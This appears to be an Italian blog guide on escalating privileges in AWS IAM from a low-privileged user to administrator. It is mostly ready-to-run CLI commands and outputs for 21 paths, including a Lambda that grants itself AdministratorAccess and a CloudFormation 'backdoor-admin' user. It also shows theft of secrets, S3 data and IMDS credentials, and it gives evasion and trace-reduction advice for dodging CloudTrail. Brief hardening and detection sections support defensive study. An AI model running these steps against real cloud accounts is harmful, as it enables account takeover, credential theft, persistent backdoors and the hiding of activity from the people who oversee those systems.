---
title: 'AWS Privilege Escalation: 21+ Tecniche per Passare da Low-Priv a Admin in IAM'
slug: aws-privilege-escalation
description: 'AWS Privilege Escalation è l’insieme di tecniche per ottenere privilegi più elevati abusando di misconfigurazioni IAM in ambienti cloud. Analisi di policy, role assumption e abuse di servizi AWS in contesti di penetration test autorizzati.'
image: /AWS.webp
draft: true
date: 2026-02-10T00:00:00.000Z
lastmod: 2026-02-10T00:00:00.000Z
categories:
  - guides-resources
subcategories:
  - concetti
tags:
  - aws
---

> **Executive Summary** — AWS IAM (Identity and Access Management) è il cuore della sicurezza cloud AWS. Ogni azione in AWS — creare un'istanza EC2, leggere un bucket S3, modificare una Lambda — è controllata da policy IAM. Il privilege escalation in AWS consiste nel partire da un set limitato di permessi e sfruttare misconfigurazioni per ottenere `AdministratorAccess` o equivalente. A differenza del privesc Linux/Windows (kernel exploit, SUID), in AWS si sfruttano permessi IAM che — combinati in modi non ovvi — permettono di auto-assegnarsi privilegi più alti. Rhino Security Labs ha documentato 21+ path di escalation, tutti basati su permessi legittimi usati in modo offensivo.**TL;DR**AWS privilege escalation sfrutta permessi IAM che consentono di modificare le proprie policy, assumere ruoli o creare risorse privilegiate.Path comuni:
> iam:AttachUserPolicy\
> iam:CreatePolicyVersion\
> iam:PassRole + creazione di risorse (Lambda, EC2, CloudFormation)Pacu è il framework standard per automatizzare enumerazione ed escalation in ambienti AWS.

## Perché il Privilege Escalation AWS è Diverso

Nel pentest tradizionale, il privilege escalation sfrutta vulnerabilità software (kernel exploit, SUID misconfiguration, service account). In AWS è diverso: sfrutti **permessi IAM legittimi** che, combinati, permettono di elevarsi. Non c'è exploit — c'è misconfiguration.

Esempio: un utente ha il permesso `iam:AttachUserPolicy`. Questo permesso è pensato per gli admin che assegnano policy agli utenti. Ma se un utente low-priv ha questo permesso su se stesso, può auto-assegnarsi `AdministratorAccess`. Game over.

La logica è sempre la stessa: **cerchi permessi che ti permettono di modificare i tuoi stessi permessi, o di creare/assumere risorse con permessi più alti dei tuoi**.

## 1. Enumerazione IAM — Il Primo Step Obbligatorio

Prima di qualsiasi escalation, devi sapere **chi sei** e **cosa puoi fare**. Senza questa mappa, procedi alla cieca.

### Chi sono?

```bash
# Identità corrente
aws sts get-caller-identity
```

**Output:**

```json
{
    "UserId": "AIDA1234567890EXAMPLE",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/dev-user"
}
```

**Lettura:** sei `dev-user` nell'account `123456789012`. L'ARN è la tua identità completa. Se l'ARN contiene `:assumed-role/`, sei un ruolo assunto (temporaneo). Se contiene `:user/`, sei un utente IAM.

### Cosa posso fare?

```bash
# Le tue policy
aws iam list-attached-user-policies --user-name dev-user
aws iam list-user-policies --user-name dev-user

# Gruppi e relative policy
aws iam list-groups-for-user --user-name dev-user
aws iam list-attached-group-policies --group-name developers

# Dettaglio di una policy
aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/DevPolicy --version-id v1
```

**Output policy:**

```json
{
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "iam:CreatePolicyVersion",
                "lambda:CreateFunction",
                "lambda:InvokeFunction",
                "iam:PassRole",
                "s3:*",
                "ec2:RunInstances"
            ],
            "Resource": "*"
        }
    ]
}
```

**Lettura dell'output:** questo utente ha **almeno 3 path di privilege escalation** visibili immediatamente:

1. `iam:CreatePolicyVersion` → può modificare una policy esistente per darsi Admin
2. `lambda:CreateFunction` + `iam:PassRole` → può creare una Lambda con un ruolo Admin
3. `ec2:RunInstances` + `iam:PassRole` → può lanciare un'istanza con un ruolo Admin

### Enumerazione automatica

```bash
# enumerate-iam: testa tutti i permessi per brute force
# https://github.com/andresriancho/enumerate-iam
python3 enumerate-iam.py --access-key AKIAIOSFODNN7EXAMPLE --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**Output:**

```
-- Account ARN: arn:aws:iam::123456789012:user/dev-user
-- Checking 2500+ AWS permissions...
[+] iam.list_users() -> SUCCESS
[+] iam.list_roles() -> SUCCESS
[+] iam.create_policy_version() -> SUCCESS (!!!)
[+] lambda.create_function() -> SUCCESS (!!!)
[+] lambda.invoke() -> SUCCESS
[+] ec2.describe_instances() -> SUCCESS
[+] s3.list_buckets() -> SUCCESS
[+] iam.pass_role() -> SUCCESS (!!!)
```

**Lettura:** enumerate-iam testa empiricamente ogni API — non si basa sulla policy (che potrebbe avere boundary o SCP che limitano). I `SUCCESS (!!!)` sono i permessi pericolosi per l'escalation.

```bash
# Pacu — framework completo
# https://github.com/RhinoSecurityLabs/pacu
pacu

# Nella shell Pacu:
import_keys dev-user
run iam__enum_permissions
run iam__privesc_scan
```

**Output Pacu privesc\_scan:**

```
[+] Privilege escalation paths found:
  1. CreateNewPolicyVersion - You can create a new version of an existing policy
  2. PassExistingRoleToNewLambdaThenInvoke - Create Lambda with privileged role
  3. PassExistingRoleToNewEC2 - Launch EC2 with privileged role
  4. AttachUserPolicy - Attach any policy to yourself
```

## 2. I 21+ Path di Privilege Escalation

### Categoria 1: Modifica diretta dei permessi IAM

Questi sono i path più diretti — modifichi i tuoi stessi permessi.

**Path 1: iam:CreatePolicyVersion**

Il permesso più pericoloso. Puoi creare una nuova versione di una policy esistente (quella assegnata a te) e renderla la versione attiva.

```bash
# Crea nuova versione con Admin
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/DevPolicy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' \
  --set-as-default
```

**Output:**

```json
{
    "PolicyVersion": {
        "VersionId": "v2",
        "IsDefaultVersion": true
    }
}
```

**Cosa è successo:** la tua policy `DevPolicy` ora permette `*` su `*` — sei Admin. Qualsiasi azione AWS è permessa. Questo è il path più pulito perché non crei nuove risorse.

**Path 2: iam:AttachUserPolicy**

```bash
aws iam attach-user-policy \
  --user-name dev-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Fatto. Hai la policy AWS managed `AdministratorAccess` attaccata al tuo utente. Sei Admin.

**Path 3: iam:AttachGroupPolicy**

```bash
aws iam attach-group-policy \
  --group-name developers \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Tutti gli utenti nel gruppo `developers` sono ora Admin.

**Path 4: iam:PutUserPolicy (inline)**

```bash
aws iam put-user-policy \
  --user-name dev-user \
  --policy-name EscalationPolicy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
  }'
```

**Path 5: iam:PutGroupPolicy (inline)**

```bash
aws iam put-group-policy \
  --group-name developers \
  --policy-name EscalationPolicy \
  --policy-document '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'
```

**Path 6: iam:AddUserToGroup**

```bash
# Se esiste un gruppo "admins":
aws iam add-user-to-group --user-name dev-user --group-name admins
```

**Path 7: iam:SetDefaultPolicyVersion**

```bash
# Se una versione precedente della policy era più permissiva:
aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/DevPolicy
# Trova una versione permissiva (v1, v3, etc)
aws iam set-default-policy-version --policy-arn [arn] --version-id v1
```

### Categoria 2: Creazione credenziali

**Path 8: iam:CreateAccessKey**

```bash
# Crea access key per un altro utente (se hai il permesso su quell'utente)
aws iam create-access-key --user-name admin-user
```

**Output:**

```json
{
    "AccessKey": {
        "UserName": "admin-user",
        "AccessKeyId": "AKIAIOSFODNN7NEW",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY_NEW"
    }
}
```

**Cosa fai dopo:** hai le credenziali dell'admin. Configura un profilo AWS CLI e opera come quell'utente.

**Path 9: iam:CreateLoginProfile**

```bash
# Crea una password per un utente che non ha accesso console
aws iam create-login-profile --user-name admin-user --password 'P3nt3st2026!' --no-password-reset-required
```

**Path 10: iam:UpdateLoginProfile**

```bash
# Cambia la password di un altro utente
aws iam update-login-profile --user-name admin-user --password 'NewP@ss2026!'
```

### Categoria 3: iam:PassRole + Creazione risorse

Questo è il pattern più elegante: crei una risorsa AWS (Lambda, EC2, CloudFormation) e le passi un ruolo con permessi alti. La risorsa esegue codice con quei permessi.

**Path 11: PassRole + Lambda (il più usato)**

```bash
# Step 1: Identifica un ruolo con permessi alti
aws iam list-roles | grep -A5 "admin\|Admin"
# arn:aws:iam::123456789012:role/AdminLambdaRole

# Step 2: Crea il codice Lambda
cat > /tmp/escalate.py << 'EOF'
import boto3
def handler(event, context):
    client = boto3.client('iam')
    # Attacca AdministratorAccess al nostro utente
    client.attach_user_policy(
        UserName='dev-user',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {'status': 'escalated'}
EOF
cd /tmp && zip escalate.zip escalate.py

# Step 3: Crea la Lambda con il ruolo Admin
aws lambda create-function \
  --function-name escalate \
  --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/AdminLambdaRole \
  --handler escalate.handler \
  --zip-file fileb://escalate.zip

# Step 4: Invoca
aws lambda invoke --function-name escalate /tmp/output.json
cat /tmp/output.json
```

**Output:**

```json
{"status": "escalated"}
```

**Cosa è successo:** la Lambda gira con `AdminLambdaRole` (che ha permessi Admin). Il codice Lambda attacca `AdministratorAccess` al tuo utente `dev-user`. Ora sei Admin.

**Path 12: PassRole + EC2 Instance (User Data)**

```bash
# Lancia EC2 con ruolo Admin e user-data script
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminInstanceProfile \
  --user-data '#!/bin/bash
    aws iam attach-user-policy --user-name dev-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'
```

L'istanza EC2 esegue lo user-data script con i permessi del ruolo associato all'instance profile.

**Path 13: PassRole + CloudFormation**

```bash
# Template CloudFormation che crea un utente admin
cat > /tmp/escalate.yaml << 'EOF'
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  AdminUser:
    Type: AWS::IAM::User
    Properties:
      UserName: backdoor-admin
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AdministratorAccess
  AdminKey:
    Type: AWS::IAM::AccessKey
    Properties:
      UserName: !Ref AdminUser
Outputs:
  AccessKey:
    Value: !Ref AdminKey
  SecretKey:
    Value: !GetAtt AdminKey.SecretAccessKey
EOF

aws cloudformation create-stack \
  --stack-name escalation \
  --template-body file:///tmp/escalate.yaml \
  --role-arn arn:aws:iam::123456789012:role/AdminCFRole \
  --capabilities CAPABILITY_NAMED_IAM
```

**Path 14: PassRole + Glue Dev Endpoint**

```bash
aws glue create-dev-endpoint \
  --endpoint-name escalate \
  --role-arn arn:aws:iam::123456789012:role/AdminGlueRole \
  --public-key "ssh-rsa AAAA..."
# SSH nell'endpoint e usa le credenziali del ruolo
```

**Path 15: PassRole + SageMaker Notebook**

```bash
aws sagemaker create-notebook-instance \
  --notebook-instance-name escalate \
  --instance-type ml.t2.medium \
  --role-arn arn:aws:iam::123456789012:role/AdminSageMakerRole
```

**Path 16: PassRole + Data Pipeline**

```bash
aws datapipeline create-pipeline --name escalate --unique-id escalate
# Configura pipeline con ShellCommandActivity che usa un ruolo privilegiato
```

### Categoria 4: Manipolazione trust e assunzione ruoli

**Path 17: sts:AssumeRole**

```bash
# Se puoi assumere un ruolo più privilegiato:
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/AdminRole \
  --role-session-name escalation
```

**Output:**

```json
{
    "Credentials": {
        "AccessKeyId": "ASIAIOSFODNN7TEMP",
        "SecretAccessKey": "tempSecretKey...",
        "SessionToken": "FwoGZXIvY..."
    }
}
```

**Path 18: iam:UpdateAssumeRolePolicy**

```bash
# Modifica la trust policy di un ruolo per permetterti di assumerlo
aws iam update-assume-role-policy \
  --role-name AdminRole \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::123456789012:user/dev-user"},
      "Action": "sts:AssumeRole"
    }]
  }'

# Ora assumi il ruolo
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name esc
```

### Categoria 5: Vettori indiretti

**Path 19: lambda:UpdateFunctionCode**

```bash
# Modifica il codice di una Lambda esistente che ha un ruolo privilegiato
aws lambda update-function-code \
  --function-name existing-admin-lambda \
  --zip-file fileb://escalate.zip
aws lambda invoke --function-name existing-admin-lambda /tmp/out.json
```

**Path 20: lambda:UpdateFunctionConfiguration + iam:PassRole**

```bash
# Cambia il ruolo di una Lambda esistente
aws lambda update-function-configuration \
  --function-name any-lambda \
  --role arn:aws:iam::123456789012:role/AdminRole
```

**Path 21: ec2:CreateInstanceProfile + ec2:AssociateIamInstanceProfile**

```bash
# Crea un instance profile con un ruolo Admin e associalo a un'istanza esistente
aws iam create-instance-profile --instance-profile-name EscProfile
aws iam add-role-to-instance-profile --instance-profile-name EscProfile --role-name AdminRole
aws ec2 associate-iam-instance-profile \
  --iam-instance-profile Name=EscProfile \
  --instance-id i-0abc123def456
# SSH nell'istanza → curl metadata → credenziali Admin
```

## 3. Post-Escalation — Cosa Fare con Admin

Una volta Admin AWS:

```bash
# Enumera tutto
aws iam list-users
aws iam list-roles
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,Tags]'
aws s3 ls

# Cerca credenziali in Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id prod/database/credentials

# Cerca in SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameter --name /prod/db/password --with-decryption

# Accesso alle istanze via SSM (senza SSH/chiavi)
aws ssm start-session --target i-0abc123def456

# S3 bucket con dati sensibili
aws s3 ls s3://corp-backup-prod/ --recursive | grep -iE "\.sql|\.bak|shadow|\.env"
aws s3 cp s3://corp-backup-prod/db_dump.sql /tmp/
```

## 4. IMDS e Metadata — Credenziali dalle Istanze

Se hai accesso a un'istanza EC2 (via [SSRF](https://hackita.it/articoli/ssrf), [SSH](https://hackita.it/articoli/ssh), webshell):

```bash
# IMDSv1 (deprecato ma ancora comune)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Output: AdminRole

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
```

**Output:**

```json
{
  "AccessKeyId": "ASIAIOSFODNN7TEMP",
  "SecretAccessKey": "tempSecret...",
  "Token": "FwoGZXIvY...",
  "Expiration": "2026-02-08T12:00:00Z"
}
```

```bash
# IMDSv2 (richiede token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Cosa fai dopo:** esporta le credenziali temporanee e usale dalla tua macchina:

```bash
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7TEMP
export AWS_SECRET_ACCESS_KEY=tempSecret...
export AWS_SESSION_TOKEN=FwoGZXIvY...
aws sts get-caller-identity
# Ora operi come il ruolo dell'istanza
```

## 5. Scenari Pratici di Pentest

### Scenario 1: Sviluppatore con troppi permessi

**Step 1:**

```bash
aws sts get-caller-identity
# dev-user
```

**Step 2:**

```bash
# enumerate-iam o Pacu
python3 enumerate-iam.py --access-key [key] --secret-key [secret]
```

**Step 3:**

```bash
# Trovato iam:CreatePolicyVersion
aws iam create-policy-version --policy-arn [arn] --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default
```

**Step 4:**

```bash
# Verifica
aws iam list-users  # Se funziona, sei Admin
```

**Tempo stimato:** 10-20 minuti

### Scenario 2: Lambda + PassRole

**Step 1:** enumera ruoli disponibili (`aws iam list-roles`)

**Step 2:** identifica un ruolo con policy Admin o con permessi ampi

**Step 3:** crea Lambda con quel ruolo, invoca, escalation completata

**Tempo stimato:** 10-15 minuti

### Scenario 3: SSRF → IMDS → Escalation

**Step 1:** SSRF in web app su EC2 → `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

**Step 2:** ottieni credenziali temporanee del ruolo EC2

**Step 3:** usa le credenziali per enumerare IAM → se il ruolo ha permessi IAM → escalation

**Tempo stimato:** 5-15 minuti (dipende dalla SSRF)

## 6. Attack Chain Completa

| Fase        | Tool                   | Azione                              | Risultato          |
| ----------- | ---------------------- | ----------------------------------- | ------------------ |
| Recon       | aws sts                | `get-caller-identity`               | Identità           |
| Enum        | enumerate-iam / Pacu   | Brute force permessi                | Mappa permessi     |
| Enum ruoli  | aws iam                | `list-roles`, `list-policies`       | Ruoli privilegiati |
| Escalation  | aws iam/lambda/ec2     | Path specifico (vedi sopra)         | Admin              |
| Secrets     | aws secretsmanager/ssm | `get-secret-value`, `get-parameter` | Credenziali        |
| Persistence | aws iam                | Crea access key, utente backdoor    | Accesso permanente |

## 7. Detection & Evasion

### Blue Team — Cosa Monitorare

* **CloudTrail**: tutte le API IAM sono loggate. `CreatePolicyVersion`, `AttachUserPolicy`, `PassRole` generano eventi
* **GuardDuty**: rileva accesso da IP anomali, credential exfiltration da IMDS
* **IAM Access Analyzer**: identifica policy troppo permissive
* **Alert critici**: `iam:CreatePolicyVersion`, `iam:AttachUserPolicy`, `iam:CreateAccessKey` su utenti non-admin

### Evasion

```
Tecnica: Usa credenziali rubate da IMDS (temporanee, IP dell'istanza)
Come: le API call arrivano dall'IP dell'istanza — sembrano traffico legittimo
Riduzione rumore: nessun nuovo IP sorgente, nessun login anomalo
```

```
Tecnica: Lambda per escalation (indirecta)
Come: la Lambda esegue la modifica IAM — l'azione è attribuita al ruolo Lambda, non al tuo utente
Riduzione rumore: le API IAM chiamate dalla Lambda appaiono come attività della Lambda
```

```
Tecnica: Modifica policy esistente (CreatePolicyVersion) vs creazione nuova
Come: non crei nuove risorse — modifichi una policy già assegnata
Riduzione rumore: meno eventi CloudTrail rispetto a AttachUserPolicy
```

## 8. Toolchain

| Tool              | Funzione                       | Link                                   |
| ----------------- | ------------------------------ | -------------------------------------- |
| **Pacu**          | Framework completo AWS pentest | github.com/RhinoSecurityLabs/pacu      |
| **enumerate-iam** | Brute force permessi per API   | github.com/andresriancho/enumerate-iam |
| **ScoutSuite**    | Audit multi-cloud              | github.com/nccgroup/ScoutSuite         |
| **Prowler**       | Security assessment AWS        | github.com/prowler-cloud/prowler       |
| **CloudFox**      | Trova path di attacco in AWS   | github.com/BishopFox/cloudfox          |
| **aws-vault**     | Gestione sicura credenziali    | github.com/99designs/aws-vault         |
| **Steampipe**     | Query SQL su risorse cloud     | steampipe.io                           |

## 9. Troubleshooting

| Errore                                 | Causa                                            | Fix                                                             |
| -------------------------------------- | ------------------------------------------------ | --------------------------------------------------------------- |
| `AccessDenied` su CreatePolicyVersion  | Non hai il permesso o c'è un Permission Boundary | Verifica boundary: `aws iam get-user --user-name dev-user`      |
| `MalformedPolicyDocument`              | JSON della policy non valido                     | Valida con `aws iam create-policy --dry-run` o jsonlint         |
| `LimitExceeded` su CreatePolicyVersion | Max 5 versioni per policy                        | Cancella una vecchia: `aws iam delete-policy-version`           |
| PassRole fallisce                      | Il ruolo non ha trust policy per il servizio     | Il ruolo deve avere `Service: lambda.amazonaws.com` nella trust |
| Lambda invoke fallisce                 | Timeout o errore di codice                       | Controlla CloudWatch Logs del Lambda                            |
| SCP blocca l'azione                    | Service Control Policy dell'Organization limita  | Non aggirabile dall'account — è un limite dell'Organization     |

## 10. FAQ

**D: Qual è il path di escalation più comune nel mondo reale?**
R: `iam:PassRole` + Lambda. Molti sviluppatori hanno PassRole per deployare Lambda e questo, combinato con un ruolo privilegiato esistente, è il path più frequente. Il secondo più comune è `iam:CreatePolicyVersion` — spesso assegnato involontariamente.

**D: Come mi proteggo dal privilege escalation?**
R: Permission Boundaries su tutti gli utenti IAM (limitano i permessi massimi anche se una policy li concede). SCP nell'Organization per limitare azioni critiche. Principio del minimo privilegio. IAM Access Analyzer per trovare policy troppo permissive.

**D: I ruoli sono più sicuri degli utenti?**
R: Sì, perché i ruoli producono credenziali temporanee (scadono in 1-12 ore). Ma un ruolo con policy troppo permissiva è altrettanto pericoloso. La differenza è che le credenziali non sono permanenti.

**D: Posso fare privesc se c'è un Permission Boundary?**
R: Dipende. Il Permission Boundary è il set massimo di permessi — anche se ti auto-assegni AdministratorAccess, il boundary lo limita. Ma se puoi modificare il boundary stesso (`iam:PutUserPermissionsBoundary`), puoi rimuoverlo e poi escalare.

**D: CloudTrail logga tutto?**
R: Quasi tutto. Le API IAM, Lambda, EC2 sono loggate di default. Alcune API (es: `s3:GetObject` su data events) richiedono configurazione aggiuntiva. Un attacker non può disabilitare CloudTrail dal proprio account senza `cloudtrail:StopLogging` — e questo stesso evento viene loggato.

## 11. Cheat Sheet Finale

### Enumerazione

| Azione        | Comando                                                             |
| ------------- | ------------------------------------------------------------------- |
| Chi sono      | `aws sts get-caller-identity`                                       |
| Mie policy    | `aws iam list-attached-user-policies --user-name [user]`            |
| Miei gruppi   | `aws iam list-groups-for-user --user-name [user]`                   |
| Policy detail | `aws iam get-policy-version --policy-arn [arn] --version-id v1`     |
| Tutti i ruoli | `aws iam list-roles`                                                |
| enumerate-iam | `python3 enumerate-iam.py --access-key [key] --secret-key [secret]` |
| Pacu scan     | `run iam__privesc_scan`                                             |

### Escalation

| Path                   | Comando chiave                                                    |
| ---------------------- | ----------------------------------------------------------------- |
| CreatePolicyVersion    | `aws iam create-policy-version --set-as-default`                  |
| AttachUserPolicy       | `aws iam attach-user-policy --policy-arn ...AdministratorAccess`  |
| PutUserPolicy          | `aws iam put-user-policy --policy-document '{...}'`               |
| AddUserToGroup         | `aws iam add-user-to-group --group-name admins`                   |
| CreateAccessKey        | `aws iam create-access-key --user-name admin-user`                |
| PassRole+Lambda        | `aws lambda create-function --role [admin-role-arn]`              |
| PassRole+EC2           | `aws ec2 run-instances --iam-instance-profile Name=AdminProfile`  |
| AssumeRole             | `aws sts assume-role --role-arn [arn]`                            |
| UpdateAssumeRolePolicy | `aws iam update-assume-role-policy --role-name AdminRole`         |
| UpdateFunctionCode     | `aws lambda update-function-code --function-name existing-lambda` |

### Post-Escalation

| Azione     | Comando                                                                        |
| ---------- | ------------------------------------------------------------------------------ |
| Secrets    | `aws secretsmanager get-secret-value --secret-id [id]`                         |
| SSM Params | `aws ssm get-parameter --name [name] --with-decryption`                        |
| Shell EC2  | `aws ssm start-session --target [instance-id]`                                 |
| S3 dump    | `aws s3 sync s3://[bucket] /tmp/dump/`                                         |
| IMDS creds | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[role]` |

### Hardening

* **Permission Boundary** su tutti gli utenti: limita i permessi massimi
* **SCP** nell'Organization: blocca `iam:CreatePolicyVersion`, `iam:AttachUserPolicy` per utenti non-admin
* **Principio del minimo privilegio**: niente `Action: "*"`, niente `Resource: "*"`
* **IMDSv2 enforced**: blocca SSRF → IMDS
* **CloudTrail** attivo su tutte le region con alert su API IAM critiche
* **IAM Access Analyzer** per identificare policy troppo permissive
* **Non usare utenti IAM** con access key permanenti — usa ruoli con SSO

### OPSEC

Ogni azione AWS è loggata in CloudTrail. `CreatePolicyVersion` e `AttachUserPolicy` sono ad alta visibilità. L'escalation via Lambda è meno diretta (l'azione IAM è attribuita al ruolo Lambda). Le credenziali IMDS sono temporanee e l'IP sorgente è l'istanza — meno sospetto. Se vuoi minimizzare il rumore, usa `iam:CreatePolicyVersion` (modifica esistente) invece di `AttachUserPolicy` (aggiunta visibile). Dopo l'escalation, ripristina la policy originale per ridurre le tracce (ma CloudTrail ha già loggato tutto).

***

Riferimento: Rhino Security Labs "AWS IAM Privilege Escalation Methods", SANS Cloud Security, AWS Security Best Practices. Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
